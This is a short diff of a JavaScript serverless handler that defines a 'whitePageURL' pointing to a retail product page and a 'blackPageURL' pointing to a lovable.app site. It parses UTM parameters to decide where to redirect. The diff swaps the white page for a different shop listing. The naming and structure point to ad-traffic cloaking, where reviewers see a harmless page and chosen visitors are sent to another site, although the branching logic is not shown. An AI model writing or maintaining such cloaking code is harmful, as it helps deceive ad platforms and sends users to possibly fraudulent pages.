@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.eurogarden.eu/en/Greenhouses/FOLIJA13mx005mmx1met-ZA-JAGODE/";
+    const whitePageURL = "https://www.otto.de/p/nikon-prostaff-p3-10x42-fernglas-C1855427829/";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
